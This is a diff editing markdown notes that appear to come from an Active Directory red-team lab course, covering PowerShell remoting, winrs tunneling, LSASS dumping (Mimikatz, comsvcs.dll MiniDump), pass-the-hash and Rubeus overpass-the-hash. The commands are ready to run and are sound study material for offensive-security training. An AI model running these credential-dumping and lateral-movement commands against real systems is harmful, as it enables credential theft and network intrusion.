@@ -38,12 +38,13 @@ PowerShell Remoting is the modern, "native" way to manage Windows. Unlike older 
 
 **Command:**
     
-    ```
+    
     # Create a persistent session variable
     $sess = New-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
+   
     # Enter the session
     Enter-PSSession -Session $sess
-    ```
+    
     
 ### **Technique B: One-to-Many (Invoke-Command)**
 **Concept:** Stateless, Parallel. You send a "Script Block" (a chunk of code) to the target. The target executes it and sends back the text output.
@@ -52,17 +53,19 @@ PowerShell Remoting is the modern, "native" way to manage Windows. Unlike older 
 
 **Command:**
    
-    ```
+    
     # Execute a block of code on a list of servers
+    
     Invoke-Command -ComputerName (Get-Content servers.txt) -ScriptBlock { Get-Process lsass }
-    ```
+    
     
 **Fileless Execution:**
     
-    ```powershell
+    
     # Loads local script into remote memory. No file drops on target disk.
+   
     Invoke-Command -FilePath C:\Tools\Enum.ps1 -ComputerName target-server
-    ```
+   
 
 ---
 
@@ -75,17 +78,17 @@ PowerShell Remoting is the modern, "native" way to manage Windows. Unlike older 
 
 **Usage:**
     
-    ```
+ 
     winrs -r:dcorp-adminsrv cmd
-    ```
+    
     
 **Port Forwarding:** WinRS can tunnel traffic, acting as a poor man's proxy.
    
-    ```
+    
     # Listens on 8080 locally, forwards to 172.16.x.x:80 via the target
     
     winrs -r:target "netsh interface portproxy add v4tov4 listenport=8080 connectport=80 connectaddress=172.16.x.x"
-    ```
+    
 
 ---
 
@@ -103,19 +106,19 @@ Once you land on a box, you need to "live off the land" or bring tools to steal 
 
 1.  **Mimikatz:** The gold standard, but highly flagged by AV/EDR.
     `sekurlsa::logonpasswords` (Dumps everything).
+
     `sekurlsa::ekeys` (Dumps AES/DES keys for tickets).
 
-2.  **SafetyKatz:** Dumps LSASS memory to a temp file, then runs Mimikatz on the file. This prevents Mimikatz from interacting directly with the live LSASS process (which crashes less often).
+3.  **SafetyKatz:** Dumps LSASS memory to a temp file, then runs Mimikatz on the file. This prevents Mimikatz from interacting directly with the live LSASS process (which crashes less often).
 
-3.  **Dumpert / Comsvcs.dll:** "Living off the Land". Uses built-in Windows DLLs to create a dump file.
+4.  **Dumpert / Comsvcs.dll:** "Living off the Land". Uses built-in Windows DLLs to create a dump file.
 
     **Mechanism:** `comsvcs.dll` has a function `MiniDump` intended for debugging. Attackers abuse it.
 
     **Command:**
-
-      ```
+    
         rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full
-        ```
+        
 
 ---
 
@@ -132,10 +135,9 @@ You have the credentials. Now, how do you use them?
 
 **Command:**
    
-    ```
     # Spawns a new PowerShell window authenticated as the target
     Invoke-Mimikatz -Command '"sekurlsa::pth /user:Admin /domain:target /ntlm:<HASH> /run:powershell.exe"'
-    ```
+    
 
 ### **B. Overpass-the-Hash (OPtH)**
 
@@ -149,10 +151,9 @@ You have the credentials. Now, how do you use them?
 
 **Command (Rubeus):**
    
-    ```
     # Requests TGT using AES Key and caches it in the current session
     Rubeus.exe asktgt /user:admin /aes256:<KEY> /opsec /ptt
-    ```
+    
 
 ---
 
